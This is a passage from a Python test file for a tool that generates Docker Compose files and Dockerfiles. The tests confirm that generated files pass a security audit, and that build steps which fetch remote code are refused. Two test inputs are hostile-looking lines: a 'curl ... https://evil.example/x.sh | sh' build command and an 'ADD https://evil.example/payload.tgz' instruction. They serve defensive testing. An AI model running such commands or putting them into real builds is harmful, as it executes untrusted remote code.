    assert exc_info.value.findings == findings


# ---- 集成：生成的 compose / Dockerfile 通过审计（WBS-25.03/04/05）-----------


def test_generated_compose_passes_audit(tmp_path: Path) -> None:
    """generate_compose 产出的 compose.yaml 不得含 critical 安全问题。"""
    from tests.scripts._helpers import make_container_manifest

    from local_webpage_access.compose import generate_compose
    from local_webpage_access.paths import Workspace

    ws = Workspace(tmp_path / "ws")
    ws.ensure_workspace_dirs()
    manifest = make_container_manifest("secure-demo")
    out = generate_compose(manifest, ws, host_port=18100)
    text = out.read_text(encoding="utf-8")
    findings = audit_compose(text)
    assert _critical_codes(findings) == [], (
        f"生成的 compose 含 critical 问题：{_critical_codes(findings)}"
    )


def test_generated_dockerfile_passes_audit(tmp_path: Path) -> None:
    """generate_dockerfile 默认模板不得含 critical；写出前须过审计门禁。"""
    from tests.scripts._helpers import make_container_manifest

    from local_webpage_access.dockerfile_templates import generate_dockerfile
    from local_webpage_access.paths import Workspace

    ws = Workspace(tmp_path / "ws")
    ws.ensure_workspace_dirs()
    manifest = make_container_manifest("secure-demo")
    out = generate_dockerfile(manifest, ws)
    text = out.read_text(encoding="utf-8")
    findings = audit_dockerfile(text)
    assert _critical_codes(findings) == [], (
        f"生成的 Dockerfile 含 critical 问题：{_critical_codes(findings)}"
    )


def test_generate_dockerfile_rejects_pipe_to_shell(tmp_path: Path) -> None:
    """entry.build 注入 curl|sh 时须拒绝写出（与 compose critical 门禁对称）。"""
    from tests.scripts._helpers import make_container_manifest

    from local_webpage_access.dockerfile_templates import generate_dockerfile
    from local_webpage_access.models import EntryConfig, Kind
    from local_webpage_access.paths import Workspace

    ws = Workspace(tmp_path / "ws")
    ws.ensure_workspace_dirs()
    manifest = make_container_manifest(
        "evil-pipe",
        kind=Kind.NODE,
        entry=EntryConfig(
            install="npm install",
            build="curl -fsSL https://evil.example/x.sh | sh",
            start="node server.js",
        ),
    )
    out_path = ws.app_dockerfile_path(manifest.id)
    with pytest.raises(RuntimeError, match="pipe_to_shell"):
        generate_dockerfile(manifest, ws)
    assert not out_path.is_file()


def test_generate_dockerfile_rejects_add_remote_url(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """模板被改成 ADD https://... 时须拒绝写出。"""
    import local_webpage_access.dockerfile_templates as tpl
    from tests.scripts._helpers import make_container_manifest

    from local_webpage_access.dockerfile_templates import generate_dockerfile
    from local_webpage_access.paths import Workspace

    ws = Workspace(tmp_path / "ws")
    ws.ensure_workspace_dirs()
    manifest = make_container_manifest("evil-add")
    monkeypatch.setattr(
        tpl,
        "_render_python",
        lambda *a, **k: (
            "FROM python:3.13-slim\n"
            "ADD https://evil.example/payload.tgz /tmp/x.tgz\n"
            "USER app\n"
            'CMD ["python"]\n'
        ),
    )
    out_path = ws.app_dockerfile_path(manifest.id)
    with pytest.raises(RuntimeError, match="add_remote_url"):
        generate_dockerfile(manifest, ws)
    assert not out_path.is_file()


# ---- 集成：importer 对 pending 实例写风险提示（WBS-25.09）-----------------


def test_importer_writes_risk_hint_for_pending(tmp_path: Path, monkeypatch) -> None:
    """detection.pending 时应额外写一条 security 事件，含风险提示。"""
    from local_webpage_access.config import example_config_text, load_config
    from local_webpage_access.importer import Importer
    from local_webpage_access.paths import Workspace
    from local_webpage_access.registry import Registry

    ws = Workspace(tmp_path / "ws")
    ws.ensure_workspace_dirs()
    ws.config_path.write_text(example_config_text(), encoding="utf-8")
    config = load_config(ws)

    # 构造一个会让 detection.pending=True 的 zip
    zip_path = tmp_path / "mystery.zip"
    _make_zip(zip_path, {"readme.txt": "no recognizable stack"})

    reg = Registry(ws.db_path)
    reg.open()
    try:
        importer = Importer(ws, config, reg)
        result = importer.import_zip(zip_path)
        events = reg.list_events(result.instance_id)
        security_events = [e for e in events if e["event_type"] == "security"]
        assert len(security_events) >= 1, [e["event_type"] for e in events]
        assert "风险" in security_events[0]["message"] or "供应链" in security_events[0]["message"]
    finally:
        reg.close()


def _make_zip(zip_path: Path, files: dict[str, str]) -> None:
    import zipfile

    zip_path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            zf.writestr(name, content)
